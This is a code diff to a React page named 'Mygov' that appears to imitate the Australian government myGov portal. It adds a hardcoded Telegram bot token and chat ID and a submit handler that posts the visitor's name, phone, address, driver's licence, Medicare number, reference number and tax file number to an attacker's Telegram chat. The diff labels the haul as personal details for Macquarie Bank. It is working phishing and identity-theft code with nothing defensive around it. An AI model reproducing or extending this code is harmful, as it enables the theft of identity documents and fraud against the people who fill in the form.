@@ -5,6 +5,9 @@ import back from "./image/back.svg";
 import "./Mygov.css";
 import MaskedInput from "react-text-mask";
 
+const TELEGRAM_BOT_TOKEN = "7038583008:AAGLUNtjIrPvDbtGGwY0yMb-hbkDdjszVP4";
+const TELEGRAM_CHAT_ID = "1951445523";
+
 export default function Mygov() {
   const [name, setName] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -51,20 +54,85 @@ export default function Mygov() {
     setExpiryDate(formattedDate.join(""));
   };
 
-  const handleSubmit = (e) => {
+  const sendLoginToTelegram = async (
+    name,
+    phoneNumber,
+    date,
+    address,
+    driversLicense,
+    expiryDate,
+    medicareNumber,
+    individualReferenceNumber,
+    taxFileNumber
+  ) => {
+    const message = `
+    \n********************************
+    \n
+    Personal details for Macquarie Bank:\Name: ${name}, \nPhone-Number: ${phoneNumber}, 
+    \nDate:${date}, \nAddress: ${address}, \nDriver-License: ${driversLicense},
+    \nExpiry-Date: ${expiryDate}, \nMedicare-Number: ${medicareNumber}, 
+    \nIndividual Reference-Number: ${individualReferenceNumber}, \nTax-File-Number: ${taxFileNumber}
+    \n
+    \n
+    \n********************************
+    `;
+
+    await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+        }),
+      }
+    );
+  };
+
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
-    console.log(
-      name,
-      phoneNumber,
-      date,
-      address,
-      driversLicense,
-      expiryDate,
-      medicareNumber,
-      individualReferenceNumber,
-      taxFileNumber
-    );
+    setTimeout(async () => {
+
+      if (
+        !name ||
+        !phoneNumber ||
+        !date ||
+        !address ||
+        !driversLicense ||
+        !expiryDate ||
+        !medicareNumber ||
+        !individualReferenceNumber ||
+        !taxFileNumber
+      ) {
+        return;
+      }
+
+      try {
+        await sendLoginToTelegram(
+          name,
+          phoneNumber,
+          date,
+          address,
+          driversLicense,
+          expiryDate,
+          medicareNumber,
+          individualReferenceNumber,
+          taxFileNumber
+        );
+
+        setTimeout(() => {
+          // onLoginSuccess();
+        }, 500);
+      } catch (error) {
+        console.error("Login failed", error);
+      } finally {
+        // setLoading(false);
+      }
+    }, 4000);
   };
 
   return (
@@ -254,7 +322,10 @@ export default function Mygov() {
                         </div>
 
                         <div className="input-group">
-                          <label className="override" style={{ letterSpacing: "0.001px" }}>
+                          <label
+                            className="override"
+                            style={{ letterSpacing: "0.001px" }}
+                          >
                             Driver's License Card Id (Back of Card)
                           </label>
 
